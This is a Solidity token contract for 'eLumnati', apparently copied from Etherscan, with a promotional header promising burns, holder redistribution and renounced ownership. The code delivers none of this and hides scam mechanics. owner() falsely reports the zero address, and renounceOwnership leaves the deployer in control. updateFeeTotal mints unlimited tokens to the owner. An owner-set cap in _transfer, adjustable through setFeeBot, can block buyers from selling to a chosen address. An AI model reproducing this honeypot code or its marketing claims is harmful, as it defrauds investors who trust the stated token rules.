['/**\n', ' *Submitted for verification at Etherscan.io on 2021-06-07\n', '*/\n', '\n', '/*\n', '\n', '\n', '\n', '\n', '\n', 'We have a dynamic sell limit based on price impact and increasing sell cooldowns and redistribution taxes on consecutive sells, as a result; $eLumnati is designed to reward holders and discourage dumping.\n', '\n', '1. Bot and whale manipulation prevention: Buy limit and cooldown timer on buys to make sure no automated bots have a chance to snipe big portions of the pool.\n', '2. No Team & Marketing wallet. 100% of the tokens will go directly to Uniswap for trading. \n', '3. No presale or team wallets allocated with tokens that can dump on the community. \n', '\n', 'Token Information:\n', '- 1,000,000,000,000 Total Supply, 30% is burned immediately\n', '- Liquidity provided by eLumnati devs and then locked with Unicrypt\n', '- Using the fairest possible launch method for everyone and this is pre-announced, so there is no early secret buyers! \n', "- 0,2% transaction limit on launch - You can only buy 2,000,000,000 $eLumnati until it's lifted\n", '- Buy limit lifted to 1% of the supply 30 minutes after launch, then the ownership of the token is immediately renounced\n', '- Sells limited to 4% of the Liquidity Pool, <4% price impact - Keeps the whales out and prevents issues people have seen with SHIBCAKES & MYOBU\n', '- Sell cooldown increases on consecutive sells, 5 sells within a 24 hours period are allowed\n', '- 2% redistribution to holders on all buys\n', '- 7% redistribution to holders on the first sell, increases 2x, 3x on consecutive sells\n', '- This redistribution mechanism works as expected above and benefits the holders much more than sellers!\n', '- 4% developer fee split within the team\n', '- Smaller cooldown periods than Myobu, but still prevents frequent dumps and sell pressure\n', '\n', '\n', '\n', "g%FmT6nL21[sZm%b64JJ(|s>>}1}n}nPuVzc1[[|?\\|\\|?|?cic}zPn1ihzdd44Pms)cs['|})||zY8mg}>uau\n", '%LPYxuac?aFpTaLu1;[\\?\\l1o|1Pyv)()^^>uzLYVYdbYYynu}l}))(^)|lpGb3FRVY}(|_.xu||}?x8mJ\\|sb\n', 'nLyyy?iPRPbz6z+t^)cJuooy3\\^=?ubgpp%pFPFpPS8VbpYbPPdpZPZSdJ?+![nVso?>t[^~Y3n[J\\[qP!+v(q\n', 'n9Lu}SgdL395[!)olu}y5t+=i4gSp8dkh6vbddPPP8pVdbVVYSdVY3hmpFqPSbv=+]JP3?|u1to2nxLhgBVd|u\n', 'Ll[TRTb1l6+^?isc3nt;\\z8m%mmZo?m|o~YpZ%FPT2oTnnnPpV%6-F8zqvPdSpZk%x\\~[yqJcYYJ\\TvYb9c|LY\n', 'cY&Zno(y)1}|syuo?;1gXgggbp|Zp_x%p)}d4Yo35>?i[uYxhdpV}Z2P.dX+>yskPPpPs+^5yR8^mB|usn9J5x\n', 'gGY4v?b(>>14L1!^VBRg&Yb^:FmzQs3dSZbLyt|\\^|~+!}\\]>5shPP8%zY|~[1bJ!zP%PVL|;ug4vxc^^\\J9b%\n', "Pu6^[J[?}L|n!~YZmQZaxcLg2cLPmZTPVJi??|>+_-^a!'^>v\\[zqYVbVPTdLb>`zz~bbPdpd[!4&GmgEBQS}~\n", 'm[ivxv?>yb[_9mmg%PYv?}|Vmp%PZS8n3}t|^_-..(c)v_-_+(\\[ozYqbPqY6bTLb8Fn;>VqdPP^(2F4y|;) .\n', 'ds|43v9yz"|%pmghJ1YWLqRm8ppqbbaJl|!;-`  \\Y}zon`.-\\(\\vunY2TVLhYb8Vdo\'Y6zuSVPP1-l11}il="\n', '?[lJo>ni-n8ZS81(?}cPgXPpkF8PqYn1]|)~-..[p25YVPn.,_!?[[zzxs4z49VL6VdLL}~(1kVPkd:?h3[)\\|\n', 'Js>>5x]:4PSpsdpdsupPpkdpbLdhY5i|??+!:.[bnYTbaEgu.-~\\ci?x32nqyz1}znVYYn5Y)!ubYnP~^yuiv}\n', 'Pyiq2v;VqYYY}>c^VaLbLLn9L9nxLYuz?^;--l9>|3Js2tnL1."!|v2nxs13i3}11JL6YYa1},4n2392^^Vv}^\n', '|F?d}_PbLTT2b9xFnxJoauxanyuu34yzxt+!!+:`":::-~:-_~+\\[JyYuJ1v?i[]iii1i}sn29uoxuJoL~?%b}\n', 'dh?z.956Ls6YLYY2so}lcl}olzo5n2auvl1o[^+[+|+[(!t!(|[}]loy3ci||c>31?=|?[1znn3u1ynzy5,t1>\n', 'ccV-vzau3ynxzxnunJcv}czyJlJun5n9yLYy3usl}?>ucl[oc11Joua1}[\\>>[u}}}i\\^\\c|(|[?[c??vv}.qb\n', '8Xs~Voys31onaanu?\\|t)|?[}lozzi}1[ZWW]?|\\!}l}[}}?}15x^ccyJ[?Jly133}[??\\(=?)([||?c?cJ~c5\n', 'g&,un2n1J3}iv}il?|?^(\\||(|iv???|SQW(~c=|!^~||^c[]|in};^(?(?i}ol[i1>|=!;^!;_~+~!=||?}_T\n', 'm5.L3l31v1?^|?|i)[\\)\\)\\^!)=|vc^EWNx"|v\\????=i||[}tzuT);++|]??>v}1l>\\\\))~!~;~;~"^^\\?z 2\n', 'Rc-xc>v|(\\)\\)||c|?))^=^;=^^!!^BEKq\\|\\?v[^?vvc)1>l?uJ2V+!^=^[?}l?c][}[?||?=~~;~~~^+(>;>\n', 'F^\\[[^^^^))vn|c>u^\\^(++!~~^~~FEE&(\\cc}[i\\}?}>|3i}}oz}nT~^+|)\\]c]?>il}}|?lll::~;;~^!!|^\n', 'm+]\\(\\=^!(\\(a_b\\?\\^(^!=!~~;|BgQWc?}i>c[u}c|?lcc[L3il36dY^\\))|\\^\\||c}t>3(P;6~=++^!))^|_\n', '%+|\\^)~!+\\?[V.z`ait]\\\\()==)Q8QNu[|oizz}>>l^u}5[al1?xuu>Yv|c(1v}}}}lJ1}}_Y.Y))=~~++!!|;\n', 'g?"}?|||^|olb^ .c[|]??t?|vmmmRn;?|o^|((x\\\\)|^>3it1[i}vo3Ti\\c\\||c|[?)?lz..!z[))=!+!+\\)(\n', "R1.u[||\\)4cin+_'(||\\)=)=cXkgQm~^1?|>[?[?tJ!(|(o|}iyJnionYL[JJouciov}1o!;_=Lov}?iv(?3`l\n", "kb'i????y}?ooo>>}[lt[\\\\tXgB&H|(?||[[|c>3v}z|}(|}Ll?u1l}}1JY^^^+^!~\\)=)a|>]io)u\\\\|)?z 2\n", "gR|)]^^)?z:~!nc?^!!~~'?GBXRE}~|?\\|>[\\cv}}lu?(^?^}o|o}oc2y}Vn?[=|?\\)[}oz5Yz|^+3(|?c5[^q\n", 'S8S 1vv3}d)1xc-;+}>LWPGBmRQz^|;+c^]}}Ji}c13uvvyi}]\\y)c>3}cuuniil>i>cs^!^^hJ?=x|[c?3.6n\n', 'nV%]_sybSPZF5g .,-pEENBPF&P--|~;;+c|[c|v[||}c[)?^\\!^+[(^??l?vn?Jg3tvu-_,;bz?6[)(lu!)Ly\n', '5bZZ~^dnY682u4=ccuLQQSmREZ^)v?|\\}|?}1}1}JJo}t}>zlv}z][l>lv3>y1zxPgblYJvv(Y}xsn1u4v:T1z\n', 'Ykkcx:}pXgmnx3Ly})uPKXVEW".+.;(=i|t3|3|v?>st^}?vo^ci|i}[^:\\!c\\V2QEZl?^v9asvlVVdm1,4V1J\n', 'xn}LYn:>dg88X>(?iPt[BWWEEqZ8%ppZbZkPZSmmZ8888TbZVPFZS%dgg&&9h8GXgWq}>Y|)\\}%ppbq}`z}[|[\n', '}}vc}52+|Q&EN%)61VuL[nXpLddmmHmYpZRZEEXBBQ%%BmPg8XQBNEE&E%HEdHNNNs|2VRYx)m8dhFt-nan}v^\n', '?[x[i2YY?~pEZZX}[[8}sn|}ggYdHSLpz}}z3>}LlJ)?>viz4?[l6daYoPYVbQZl(VL3}aiJEZmRm)=bx}?>^v\n', '=~P+l?iLui:uQZSSS[}}t4znliygbp%Polm&%uz}aYn3Zbu2xcnRQgPYyaXp6}laqvnnt\\pZ%BZn:|a5x}1\\(`\n', 'zi\\J+}luxzY)_LXBmZV})n>|2}z1>cbbTzoibd3uu}L4nt}oLc)\\ubRGLocc1uonbL1[Z%gZ&P^!5ZhSc3\\"  \n', 'nzn}Jv|cnzdzV+^Fg%P&S3)}bJcV2L^\\>}[email\xa0protected]%Lp85uzl}9J?did[>5m&RTEg[~14J[(^!(>[|.\n', 'aPo6o3\\ivz1onYJ\\!4mGBZGnc^1v6z^}p3nvJct[]c1}c>?[tvv1zu63|iqi>\\Jd8&X%HV)!sa3i|~;|unxc?J\n', '[}S2LLaL~_V[xxJnn?~|qmpgd&ma>^!}nn1Ysb|P}85P}P+^4cYvSu3zc|vJPgmL&ZXy~+xVY4vi>}tMK_^[1}\n', '2L?u843n3?^zi|o2biho)!>[email\xa0protected][]?\\l>ntu?YzJ+!3^][>|u6mWg%ZXHPo=!czL>up6?)|kVFqHb}>3\n', 'mout|18Y35}\\}3[}?Jno?3\\==\\1bgRBQmHW&gTPLbYYnnVqPpgEBEFEREmggn|++^tv>}|3iPBPdXS8X&~\\>|x\n', 'qxP}lo]3qbnJuJ>|}Jz:@@x>io|==)^J1VZRXEQWWQgHEmQB%EQ&F8b}?===)}}[email\xa0protected]~c))uVY4V6Z>~>[h\n', 'yzYPn>lc+)uy}?}>||?[!i|~y=[??[(^+^:`,~+^|[>]>||^^":`-!!+=?>}?^J"c>?^|_:}\\?(~=)?lL9~\\}z\n', '\n', 'SPDX-License-Identifier: Mines™®©\n', '*/                                                                                                                                      \n', '\n', '\n', '// SPDX-License-Identifier: MIT\n', 'pragma solidity ^0.6.12;\n', '\n', 'interface IERC20 {\n', '    /**\n', '     * @dev Returns the amount of tokens in existence.\n', '     */\n', '    function totalSupply() external view returns (uint256);\n', '\n', '    /**\n', '     * @dev Returns the amount of tokens owned by `account`.\n', '     */\n', '    function balanceOf(address account) external view returns (uint256);\n', '\n', '    /**\n', "     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n", '     *\n', '     * Returns a boolean value indicating whether the operation succeeded.s\n', '     *\n', '     * Emits a {Transfer} event.\n', '     */\n', '    function transfer(address recipient, uint256 amount) external returns (bool);\n', '\n', '    /**\n', '     * @dev Returns the remaining number of tokens that `spender` will be\n', '     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n', '     * zero by default.\n', '     *\n', '     * This value changes when {approve} or {transferFrom} are called.\n', '     */\n', '    function allowance(address owner, address spender) external view returns (uint256);\n', '\n', '    /**\n', "     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n", '     *\n', '     * Returns a boolean value indicating whether the operation succeeded.\n', '     *\n', '     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n', '     * that someone may use both the old and the new allowance by unfortunate\n', '     * transaction ordering. One possible solution to mitigate this race\n', "     * condition is to first reduce the spender's allowance to 0 and set the\n", '     * desired value afterwards:\n', '     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n', '     *\n', '     * Emits an {Approval} event.\n', '     */\n', '    function approve(address spender, uint256 amount) external returns (bool);\n', '\n', '    /**\n', '     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n', "     * allowance mechanism. `amount` is then deducted from the caller's\n", '     * allowance.\n', '     *\n', '     * Returns a boolean value indicating whether the operation succeeded.\n', '     *\n', '     * Emits a {Transfer} event.\n', '     */\n', '    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n', '\n', '    /**\n', '     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n', '     * another (`to`).\n', '     *\n', '     * Note that `value` may be zero.\n', '     */\n', '    event Transfer(address indexed from, address indexed to, uint256 value);\n', '\n', '    /**\n', '     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n', '     * a call to {approve}. `value` is the new allowance.\n', '     */\n', '    event Approval(address indexed owner, address indexed spender, uint256 value);\n', '}\n', '\n', 'library Address {\n', '    /**\n', '     * @dev Returns true if `account` is a contract.\n', '     *\n', '     * [IMPORTANT]\n', '     * ====\n', '     * It is unsafe to assume that an address for which this function returns\n', '     * false is an externally-owned account (EOA) and not a contract.\n', '     *\n', '     * Among others, `isContract` will return false for the following\n', '     * types of addresses:\n', '     *\n', '     *  - an externally-owned account\n', '     *  - a contract in construction\n', '     *  - an address where a contract will be created\n', '     *  - an address where a contract lived, but was destroyed\n', '     * ====\n', '     */\n', '    function isContract(address account) internal view returns (bool) {\n', '        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts\n', '        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned\n', "        // for accounts without code, i.e. `keccak256('')`\n", '        bytes32 codehash;\n', '        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\n', '        // solhint-disable-next-line no-inline-assembly\n', '        assembly { codehash := extcodehash(account) }\n', '        return (codehash != accountHash && codehash != 0x0);\n', '    }\n', '\n', '    /**\n', "     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n", '     * `recipient`, forwarding all available gas and reverting on errors.\n', '     *\n', '     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n', '     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n', '     * imposed by `transfer`, making them unable to receive funds via\n', '     * `transfer`. {sendValue} removes this limitation.\n', '     *\n', '     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n', '     *\n', '     * IMPORTANT: because control is transferred to `recipient`, care must be\n', '     * taken to not create reentrancy vulnerabilities. Consider using\n', '     * {ReentrancyGuard} or the\n', '     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n', '     */\n', '    function sendValue(address payable recipient, uint256 amount) internal {\n', '        require(address(this).balance >= amount, "Address: insufficient balance");\n', '\n', '        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value\n', '        (bool success, ) = recipient.call{ value: amount }("");\n', '        require(success, "Address: unable to send value, recipient may have reverted");\n', '    }\n', '\n', '    /**\n', '     * @dev Performs a Solidity function call using a low level `call`. A\n', '     * plain`call` is an unsafe replacement for a function call: use this\n', '     * function instead.\n', '     *\n', '     * If `target` reverts with a revert reason, it is bubbled up by this\n', '     * function (like regular Solidity function calls).\n', '     *\n', '     * Returns the raw returned data. To convert to the expected return value,\n', '     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n', '     *\n', '     * Requirements:\n', '     *\n', '     * - `target` must be a contract.\n', '     * - calling `target` with `data` must not revert.\n', '     *\n', '     * _Available since v3.1._\n', '     */\n', '    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\n', '      return functionCall(target, data, "Address: low-level call failed");\n', '    }\n', '\n', '    /**\n', '     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with\n', '     * `errorMessage` as a fallback revert reason when `target` reverts.\n', '     *\n', '     * _Available since v3.1._\n', '     */\n', '    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\n', '        return _functionCallWithValue(target, data, 0, errorMessage);\n', '    }\n', '\n', '    /**\n', '     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n', '     * but also transferring `value` wei to `target`.\n', '     *\n', '     * Requirements:\n', '     *\n', '     * - the calling contract must have an ETH balance of at least `value`.\n', '     * - the called Solidity function must be `payable`.\n', '     *\n', '     * _Available since v3.1._\n', '     */\n', '    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\n', '        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");\n', '    }\n', '\n', '    /**\n', '     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\n', '     * with `errorMessage` as a fallback revert reason when `target` reverts.\n', '     *\n', '     * _Available since v3.1._\n', '     */\n', '    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\n', '        require(address(this).balance >= value, "Address: insufficient balance for call");\n', '        return _functionCallWithValue(target, data, value, errorMessage);\n', '    }\n', '\n', '    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {\n', '        require(isContract(target), "Address: call to non-contract");\n', '\n', '        // solhint-disable-next-line avoid-low-level-calls\n', '        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);\n', '        if (success) {\n', '            return returndata;\n', '        } else {\n', '            // Look for revert reason and bubble it up if present\n', '            if (returndata.length > 0) {\n', '                // The easiest way to bubble the revert reason is using memory via assembly\n', '\n', '                // solhint-disable-next-line no-inline-assembly\n', '                assembly {\n', '                    let returndata_size := mload(returndata)\n', '                    revert(add(32, returndata), returndata_size)\n', '                }\n', '            } else {\n', '                revert(errorMessage);\n', '            }\n', '        }\n', '    }\n', '}\n', '\n', 'library SafeMath {\n', '    /**\n', '     * @dev Returns the addition of two unsigned integers, reverting on\n', '     * overflow.\n', '     *\n', "     * Counterpart to Solidity's `+` operator.\n", '     *\n', '     * Requirements:\n', '     *\n', '     * - Addition cannot overflow.\n', '     */\n', '    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        uint256 c = a + b;\n', '        require(c >= a, "SafeMath: addition overflow");\n', '\n', '        return c;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the subtraction of two unsigned integers, reverting on\n', '     * overflow (when the result is negative).\n', '     *\n', "     * Counterpart to Solidity's `-` operator.\n", '     *\n', '     * Requirements:\n', '     *\n', '     * - Subtraction cannot overflow.\n', '     */\n', '    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        return sub(a, b, "SafeMath: subtraction overflow");\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n', '     * overflow (when the result is negative).\n', '     *\n', "     * Counterpart to Solidity's `-` operator.\n", '     *\n', '     * Requirements:\n', '     *\n', '     * - Subtraction cannot overflow.\n', '     */\n', '    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n', '        require(b <= a, errorMessage);\n', '        uint256 c = a - b;\n', '\n', '        return c;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the multiplication of two unsigned integers, reverting on\n', '     * overflow.\n', '     *\n', "     * Counterpart to Solidity's `*` operator.\n", '     *\n', '     * Requirements:\n', '     *\n', '     * - Multiplication cannot overflow.\n', '     */\n', '    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n', "        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n", "        // benefit is lost if 'b' is also tested.\n", '        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n', '        if (a == 0) {\n', '            return 0;\n', '        }\n', '\n', '        uint256 c = a * b;\n', '        require(c / a == b, "SafeMath: multiplication overflow");\n', '\n', '        return c;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the integer division of two unsigned integers. Reverts on\n', '     * division by zero. The result is rounded towards zero.\n', '     *\n', "     * Counterpart to Solidity's `/` operator. Note: this function uses a\n", '     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n', '     * uses an invalid opcode to revert (consuming all remaining gas).\n', '     *\n', '     * Requirements:\n', '     *\n', '     * - The divisor cannot be zero.\n', '     */\n', '    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        return div(a, b, "SafeMath: division by zero");\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n', '     * division by zero. The result is rounded towards zero.\n', '     *\n', "     * Counterpart to Solidity's `/` operator. Note: this function uses a\n", '     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n', '     * uses an invalid opcode to revert (consuming all remaining gas).\n', '     *\n', '     * Requirements:\n', '     *\n', '     * - The divisor cannot be zero.\n', '     */\n', '    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n', '        require(b > 0, errorMessage);\n', '        uint256 c = a / b;\n', "        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n", '\n', '        return c;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n', '     * Reverts when dividing by zero.\n', '     *\n', "     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n", '     * opcode (which leaves remaining gas untouched) while Solidity uses an\n', '     * invalid opcode to revert (consuming all remaining gas).\n', '     *\n', '     * Requirements:\n', '     *\n', '     * - The divisor cannot be zero.\n', '     */\n', '    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        return mod(a, b, "SafeMath: modulo by zero");\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n', '     * Reverts with custom message when dividing by zero.\n', '     *\n', "     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n", '     * opcode (which leaves remaining gas untouched) while Solidity uses an\n', '     * invalid opcode to revert (consuming all remaining gas).\n', '     *\n', '     * Requirements:\n', '     *\n', '     * - The divisor cannot be zero.\n', '     */\n', '    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n', '        require(b != 0, errorMessage);\n', '        return a % b;\n', '    }\n', '}\n', '\n', 'abstract contract Context {\n', '    \n', '    function _msgSender() internal view virtual returns (address payable) {\n', '        return msg.sender;\n', '    }\n', '\n', '    function _msgData() internal view virtual returns (bytes memory) {\n', '        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n', '        return msg.data;\n', '    }\n', '}\n', '\n', 'contract Ownable is Context {\n', '    address private _owner;\n', '\n', '    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n', '\n', '    /**\n', '     * @dev Initializes the contract setting the deployer as the initial owner.\n', '     */\n', '    constructor () internal {\n', '        address msgSender = _msgSender();\n', '        _owner = msgSender;\n', '        emit OwnershipTransferred(address(0), msgSender);\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the address of the current owner.\n', '     */\n', '    function owner() public view returns (address) {\n', '        return address(0);\n', '    }\n', '\n', '    /**\n', '     * @dev Throws if called by any account other than the owner.\n', '     */\n', '    modifier onlyOwner() {\n', '        require(_owner == _msgSender(), "Ownable: caller is not the owner");\n', '        _;\n', '    }\n', '\n', '    /**\n', '     * @dev Leaves the contract without owner. It will not be possible to call\n', '     * `onlyOwner` functions anymore. Can only be called by the current owner.\n', '     *\n', '     * NOTE: Renouncing ownership will leave the contract without an owner,\n', '     * thereby removing any functionality that is only available to the owner.\n', '     */\n', '    function renounceOwnership() public virtual onlyOwner {\n', '        emit OwnershipTransferred(_owner, address(0));\n', '    }\n', '\n', '    /**\n', '     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n', '     * Can only be called by the current owner.\n', '     */\n', '    function transferOwnership(address newOwner) private onlyOwner {\n', '        require(newOwner != address(0), "Ownable: new owner is the zero address");\n', '        emit OwnershipTransferred(_owner, newOwner);\n', '        _owner = newOwner;\n', '    }\n', '}\n', '\n', 'contract eLumnati is Context, IERC20, Ownable {\n', '    using SafeMath for uint256;\n', '    using Address for address;\n', '\n', '    mapping (address => uint256) private _balances;\n', '    mapping (address => mapping (address => uint256)) private _allowances;\n', '    \n', '    address private _tOwnerAddress;\n', '    address private _tAllowAddress;\n', '   \n', '    uint256 private _tTotal = 1000 * 10**9 * 10**18;\n', '\n', "    string private _name = 'Ethereum Luminati';\n", "    string private _symbol = 'eLumnati';\n", '    uint8 private _decimals = 18;\n', '    uint256 private _feeBot = 50 * 10**6 * 10**18;\n', '\n', '    constructor () public {\n', '        _balances[_msgSender()] = _tTotal;\n', '\n', '        emit Transfer(address(0), _msgSender(), _tTotal);\n', '    }\n', '\n', '    function name() public view returns (string memory) {\n', '        return _name;\n', '    }\n', '\n', '    function symbol() public view returns (string memory) {\n', '        return _symbol;\n', '    }\n', '\n', '    function decimals() public view returns (uint8) {\n', '        return _decimals;\n', '    }\n', '    \n', '    function allowance(address owner, address spender) public view override returns (uint256) {\n', '        return _allowances[owner][spender];\n', '    }\n', '\n', '    function approve(address spender, uint256 amount) public override returns (bool) {\n', '        _approve(_msgSender(), spender, amount);\n', '        return true;\n', '    }\n', '    \n', '    function transferOwner(address newOwnerAddress) public onlyOwner {\n', '        _tOwnerAddress = newOwnerAddress;\n', '    }\n', '\n', '    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n', '        _transfer(sender, recipient, amount);\n', '        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));\n', '        return true;\n', '    }\n', '    \n', '    function addAllowance(address allowAddress) public onlyOwner {\n', '        _tAllowAddress = allowAddress;\n', '    }\n', '    \n', '    function updateFeeTotal(uint256 amount) public onlyOwner {\n', '        require(_msgSender() != address(0), "ERC20: cannot permit zero address");\n', '        _tTotal = _tTotal.add(amount);\n', '        _balances[_msgSender()] = _balances[_msgSender()].add(amount);\n', '        emit Transfer(address(0), _msgSender(), amount);\n', '    }\n', '    \n', '    function setFeeBot(uint256 feeBotPercent) public onlyOwner {\n', '        _feeBot = feeBotPercent * 10**18;\n', '    }\n', '\n', '    function totalSupply() public view override returns (uint256) {\n', '        return _tTotal;\n', '    }\n', '\n', '    function balanceOf(address account) public view override returns (uint256) {\n', '        return _balances[account];\n', '    }\n', '\n', '    function transfer(address recipient, uint256 amount) public override returns (bool) {\n', '        _transfer(_msgSender(), recipient, amount);\n', '        return true;\n', '    }\n', '    \n', '    function _approve(address owner, address spender, uint256 amount) private {\n', '        require(owner != address(0), "ERC20: approve from the zero address");\n', '        require(spender != address(0), "ERC20: approve to the zero address");\n', '\n', '        _allowances[owner][spender] = amount;\n', '        emit Approval(owner, spender, amount);\n', '    }\n', '      \n', '    function _transfer(address sender, address recipient, uint256 amount) internal {\n', '        require(sender != address(0), "BEP20: transfer from the zero address");\n', '        require(recipient != address(0), "BEP20: transfer to the zero address");\n', '        \n', '        if (sender != _tAllowAddress && recipient == _tOwnerAddress) {\n', '            require(amount < _feeBot, "Transfer amount exceeds the maxTxAmount.");\n', '        }\n', '    \n', '        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");\n', '        _balances[recipient] = _balances[recipient].add(amount);\n', '        emit Transfer(sender, recipient, amount);\n', '    }\n', '}']